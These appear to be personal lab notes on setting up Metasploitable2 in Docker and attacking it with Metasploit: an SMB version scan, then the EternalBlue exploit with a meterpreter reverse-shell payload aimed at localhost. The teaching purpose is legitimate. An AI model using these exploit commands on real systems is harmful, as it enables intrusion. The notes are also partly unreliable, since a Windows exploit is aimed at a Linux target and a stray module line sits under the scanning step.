# 1. Preparation
## Use Docker to run Metasploit

### Check Docker status
`docker --version`

# 2. Build attack target
### Download Metasploit2 
`docker pull tleemcjr/metasploitable2`

### Run Metasploit2 in Docker
`docker run -d --name vulnerable -p 445:445 -p 21:21 -p 22:22 -p 80:80 tleemcjr/metasploitable2`

- -p 445:445：開放 SMB（檔案共享漏洞）
- -p 21:21：開放 FTP（容易被暴力破解）
- -p 22:22：開放 SSH（可能存在弱密碼）
- -p 80:80：開放 Web 服務（可能存在漏洞）

### Check Metasploit2 in Docker status
`docker ps`

# 3. Run attacker
### Run Metasploit in Docker
`docker run --rm -it metasploitframework/metasploit-framework  # delete when exit docker`

`docker run -it --name metasploit metasploitframework/metasploit-framework  # keep docker container`
`docker start -ai metasploit  # run docker with next time`
`help  # check metasploit status`

# 4. Scan target system
use exploit/multi/samba/usermap_script

msf6 > use auxiliary/scanner/smb/smb_version
msf6 auxiliary(scanner/smb/smb_version) > set RHOSTS 127.0.0.1
msf6 auxiliary(scanner/smb/smb_version) > run

## exploit
msf6 > use exploit/windows/smb/ms17_010_eternalblue
msf6 exploit(windows/smb/ms17_010_eternalblue) > set RHOSTS 127.0.0.1
msf6 exploit(windows/smb/ms17_010_eternalblue) > set PAYLOAD windows/x64/meterpreter/reverse_tcp
msf6 exploit(windows/smb/ms17_010_eternalblue) > set LHOST 127.0.0.1
msf6 exploit(windows/smb/ms17_010_eternalblue) > exploit




